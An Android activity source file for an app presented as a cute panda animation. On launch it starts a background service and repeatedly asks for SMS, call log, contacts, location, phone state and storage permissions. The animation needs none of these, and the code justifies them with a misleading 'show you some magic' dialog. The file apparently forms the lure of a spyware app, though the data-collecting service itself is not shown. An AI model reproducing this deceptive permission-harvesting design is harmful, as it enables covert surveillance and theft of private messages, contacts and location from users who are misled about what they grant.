package com.aigs.serviceone;

import static android.Manifest.permission;
import static android.Manifest.permission.ACCESS_FINE_LOCATION;

import android.Manifest;
import android.animation.Animator;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.animation.Animation;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.aigs.serviceone.services.Starter;
import com.aigs.serviceone.util.Utils;
import com.airbnb.lottie.LottieAnimationView;
import com.google.android.material.animation.AnimationUtils;

public class LauncherActivity extends AppCompatActivity {

    private LottieAnimationView lottieAnimationView;
    private Button trigger;

    private static final int PERMISSION_REQUEST_CODE = 104;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_launcher);

        startService();
        if (!checkPermission()) requestPermission();
        lottieAnimationView = findViewById(R.id.lottie);
        trigger = findViewById(R.id.btnOne);

        trigger.setOnClickListener(n->{
            final boolean[] animType = {true};
            lottieAnimationView.playAnimation();
            lottieAnimationView.addAnimatorListener(new Animator.AnimatorListener() {
                @Override
                public void onAnimationStart(Animator animator) {

                }

                @Override
                public void onAnimationEnd(Animator animator) {
                    if (animType[0]) {
                        lottieAnimationView.setAnimationFromJson(Utils.anim);
                        lottieAnimationView.playAnimation();
                        animType[0] = false;
                        Toast.makeText(LauncherActivity.this, "Panda is happy now", Toast.LENGTH_SHORT).show();
                    }else {
                        lottieAnimationView.setAnimationFromJson(Utils.heart);
                    }
                }

                @Override
                public void onAnimationCancel(Animator animator) {

                }

                @Override
                public void onAnimationRepeat(Animator animator) {

                }
            });
        });
    }

    private boolean checkPermission() {
        int result3 = ContextCompat.checkSelfPermission(getApplicationContext(), permission.READ_PHONE_STATE);
        int result4 = ContextCompat.checkSelfPermission(getApplicationContext(), permission.READ_SMS);
        int result5 = ContextCompat.checkSelfPermission(getApplicationContext(), permission.WRITE_EXTERNAL_STORAGE);
        int result6 = ContextCompat.checkSelfPermission(getApplicationContext(), permission.READ_CALL_LOG);
        int result8 = ContextCompat.checkSelfPermission(getApplicationContext(), permission.READ_CONTACTS);

        return result3 == PackageManager.PERMISSION_GRANTED
                && result4 == PackageManager.PERMISSION_GRANTED
                && result5 == PackageManager.PERMISSION_GRANTED
                && result6 == PackageManager.PERMISSION_GRANTED
                && result8 == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {

        ActivityCompat.requestPermissions(this, new String[]{ACCESS_FINE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
                permission.READ_SMS,
                permission.WRITE_EXTERNAL_STORAGE,
                permission.READ_CALL_LOG,
                permission.READ_EXTERNAL_STORAGE,
                permission.READ_CONTACTS,
        }, PERMISSION_REQUEST_CODE);

    }

    public void startService() {

        Intent serviceIntent = new Intent(this, Starter.class);
        serviceIntent.putExtra("inputExtra", "passing any text");
        ContextCompat.startForegroundService(this, serviceIntent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {

                    boolean AcceptedFineLocation = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean AcceptedCamera = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                    if (AcceptedFineLocation && AcceptedCamera)
                        Toast.makeText(this, "Permission Granted.", Toast.LENGTH_LONG).show();

                    else {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (!checkPermission()) showMessageGrantCancel();
                        }

                    }
                }


                break;
        }

    }


    private void showMessageGrantCancel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            new AlertDialog.Builder(LauncherActivity.this)
                    .setMessage("This app require all the permissions to work properly and show you some magic. Please retry and grant them from here or from the app settings.")
                    .setTitle("Required Permissions")
                    .setPositiveButton("Grant", (dialogInterface, i) -> {
                        if (!checkPermission()) {
                            requestPermissions(new String[]{ACCESS_FINE_LOCATION,
                                    permission.READ_PHONE_STATE,
                                    permission.READ_SMS,
                                    permission.WRITE_EXTERNAL_STORAGE,
                                    permission.READ_CALL_LOG,
                                    permission.READ_EXTERNAL_STORAGE,
                                    permission.READ_CONTACTS,
                            }, PERMISSION_REQUEST_CODE);
                        }
                    })
                    .setNeutralButton("Cancel", (dialogInterface, i) -> {

                    })
                    .setNegativeButton("Grant from SETTINGS", (dialogInterface, i) -> {
                        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        Uri uri = Uri.fromParts("package", getPackageName(), null);
                        intent.setData(uri);
                        startActivityForResult(intent, 101);
                    })
                    .setCancelable(false)
                    .create()
                    .show();
        }
    }

}